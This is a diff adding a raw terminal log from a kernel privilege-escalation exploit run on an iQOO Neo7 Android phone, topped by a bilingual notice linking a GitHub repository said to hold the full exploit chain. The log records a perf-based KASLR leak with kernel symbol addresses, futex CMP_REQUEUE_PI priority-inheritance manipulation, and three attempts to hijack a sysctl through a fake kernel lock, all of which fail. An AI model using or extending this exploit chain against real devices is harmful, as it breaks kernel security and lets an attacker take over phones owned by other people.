@@ -1,0 +1,70 @@
+
+======================================================================
+ NOTICE: the complete exploit chain for this device is open source
+ and free: https://github.com/YUE546/IQOO-neo7-ghostlock-43499
+ If you obtained this tool through a paid channel, request a refund.
+ 注意：本机型的完整漏洞利用链已开源并免费发布
+ （https://github.com/YUE546/IQOO-neo7-ghostlock-43499），
+ 如果你通过付费渠道获得本工具，建议退款处理。
+======================================================================
+
+[33m[*] [0mp0: perf leak ev=hw-cycles samples=8 min_ip=ffffffe76a2a6128
+[32m[+] [0mp0: perf KASLR leak text_base=ffffffe76a200000 slide=0000002762200000
+[32m[+] [0mstartup context pid=5202 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=5202 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=5202 label=mt6983t_gl_5_10_233 slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=5202 phys_offset=0000000040000000 kernel_phys_load=0000000048000000 delta=0000000008000000 slide_logger=ffffffe76cce16e8 bootid_data=ffffffe76d0e5b78 init_task=ffffffe76ccec200 root_tg=ffffffe76cf32140 sysctl_bootid=ffffffe76d0e5b75
+[33m[*] [0msysctl route start pid=5202
+[33m[*] [0mdm: anon=0x7deadf9000 phys=0x21e743000 base(dm)=0xffffff81de743000 fake_lock=0xffffff81de743000 w0=0xffffff81de743080 ftask=0xffffff81de743100 armed=1 val=0xffffffe76cce1628 tgt=0xffffffe76ce452d8
+[33m[*] [0msysctl walk hijack attempt=1 base=ffffff81de743000 value=ffffffe76cce1628 target=ffffffe76ce452d8 shift=-2
+[32m[+] [0mslide child context route=pselect pid=5210 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+M0 pre-clone
+M1 waiter-cloned
+M2 threads-up
+O0 owner-entry
+O1 target-locked
+O2 pre-chain-lock
+[33m[*] [0mwalk trace M5: firing CMP_REQUEUE_PI
+[33m[*] [0mwalk trace M6: CMP_REQUEUE_PI done errno=35
+[33m[*] [0mmcast fire: fd=3 ret=-1 errno=99
+O3 chain-locked
+[31m[-] [0mconsumer fire tid=5213 nice=1 ret=0 errno=0 (ret=0 => adjust_pi triggered on ghost)
+[33m[*] [0mslide mcast stamp ret=-1 errno=99 calls=1 sched_ok=1 last_sched_ret=0 last_sched_errno=0
+[33m[*] [0msysctl walk hijack attempt 1 failed reaped=1 status=0x100
+[33m[*] [0msysctl last_raw=039456208fac4169a96abeae13d08425
+[33m[*] [0mdm: anon=0x7deadf9000 phys=0x64b00000 base(dm)=0xffffff8024b00000 fake_lock=0xffffff8024b00000 w0=0xffffff8024b00080 ftask=0xffffff8024b00100 armed=1 val=0xffffffe76cce1628 tgt=0xffffffe76ce452d8
+[33m[*] [0msysctl walk hijack attempt=2 base=ffffff8024b00000 value=ffffffe76cce1628 target=ffffffe76ce452d8 shift=-2
+[32m[+] [0mslide child context route=pselect pid=5260 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+M0 pre-clone
+M1 waiter-cloned
+M2 threads-up
+O0 owner-entry
+O1 target-locked
+O2 pre-chain-lock
+[33m[*] [0mwalk trace M5: firing CMP_REQUEUE_PI
+[33m[*] [0mwalk trace M6: CMP_REQUEUE_PI done errno=35
+O3 chain-locked
+[33m[*] [0mmcast fire: fd=3 ret=-1 errno=99
+[31m[-] [0mconsumer fire tid=5261 nice=1 ret=0 errno=0 (ret=0 => adjust_pi triggered on ghost)
+[33m[*] [0mslide mcast stamp ret=-1 errno=99 calls=1 sched_ok=1 last_sched_ret=0 last_sched_errno=0
+[33m[*] [0msysctl walk hijack attempt 2 failed reaped=1 status=0x100
+[33m[*] [0msysctl last_raw=039456208fac4169a96abeae13d08425
+[33m[*] [0mdm: anon=0x7deadf9000 phys=0x864c5000 base(dm)=0xffffff80464c5000 fake_lock=0xffffff80464c5000 w0=0xffffff80464c5080 ftask=0xffffff80464c5100 armed=1 val=0xffffffe76cce1628 tgt=0xffffffe76ce452d8
+[33m[*] [0msysctl walk hijack attempt=3 base=ffffff80464c5000 value=ffffffe76cce1628 target=ffffffe76ce452d8 shift=-2
+[32m[+] [0mslide child context route=pselect pid=5283 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+M0 pre-clone
+M1 waiter-cloned
+M2 threads-up
+O0 owner-entry
+O1 target-locked
+O2 pre-chain-lock
+[33m[*] [0mwalk trace M5: firing CMP_REQUEUE_PI
+[33m[*] [0mwalk trace M6: CMP_REQUEUE_PI done errno=35
+[33m[*] [0mmcast fire: fd=3 ret=-1 errno=99
+[31m[-] [0mconsumer fire tid=5284 nice=1 ret=0 errno=0 (ret=0 => adjust_pi triggered on ghost)
+[33m[*] [0mslide mcast stamp ret=-1 errno=99 calls=1 sched_ok=1 last_sched_ret=0 last_sched_errno=0
+O3 chain-locked
+[33m[*] [0msysctl walk hijack attempt 3 failed reaped=1 status=0x100
+[33m[*] [0msysctl last_raw=039456208fac4169a96abeae13d08425
+[31m[-] [0msysctl short route failed
+[31m[!] [0msysctl stage failed
